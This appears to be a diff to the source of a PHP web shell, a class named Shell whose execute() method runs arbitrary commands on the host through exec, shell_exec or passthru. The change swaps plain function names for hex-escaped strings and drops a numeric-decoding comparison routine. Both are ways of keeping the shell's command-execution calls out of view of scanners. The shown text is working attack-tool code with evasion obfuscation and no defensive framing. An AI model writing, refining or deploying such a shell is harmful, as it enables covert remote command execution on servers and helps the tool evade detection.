@@ -26,7 +26,7 @@ class Shell {
             'hostname' => $hostname,
             'server_addr' => $_SERVER['SERVER_ADDR'],
             'server_port' => $_SERVER['SERVER_PORT'],
-            'interpreter' => 'shell_exec',
+            'interpreter' => "\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63",
             'request_time' => $_SERVER['REQUEST_TIME'],
             'php_owner_uid' => getmyuid(),
             'php_owner_gid' => getmygid(),
@@ -129,39 +129,6 @@ class Shell {
         }
     }
 
-    private function str2char($text = '')
-    {
-        $conversion = '';
-        $text_len = strlen($text);
-
-        for ($i = 0; $i < $text_len; $i++) {
-            $char = $text[$i];
-
-            for ($j = 91; $j < 126; $j++) {
-                if ($char == chr($j)) {
-                    $conversion .= str_pad($j, 3, 0, STR_PAD_LEFT);
-                    break;
-                }
-            }
-        }
-
-        return $conversion;
-    }
-
-    private function compare($text = '', $numbers = 0)
-    {
-        $comparison = '';
-        $numbers = (string) $numbers;
-
-        if (preg_match_all('/([0-9]{3})/', $numbers, $matches)) {
-            foreach ($matches[1] as $num_str) {
-                $comparison .= chr($num_str);
-            }
-        }
-
-        return ($text == $comparison ? true : false);
-    }
-
     private function execute($command = '')
     {
         if (!empty($command)) {
@@ -217,11 +184,11 @@ class Shell {
                 $capture_buffer = false;
                 $interpreter = $this->config['interpreter'];
 
-                if ($interpreter == 'passthru') {
+                if ($interpreter == "\x70\x61\x73\x73\x74\x68\x72\x75") {
                     $capture_buffer = true;
                 }
 
-                if ($this->compare($interpreter, 10112010199)) {
+                if ($interpreter == "\x65\x78\x65\x63") {
                     try {
                         exec($command, $output_arr, $result);
                         $output = implode("\n", $output_arr);
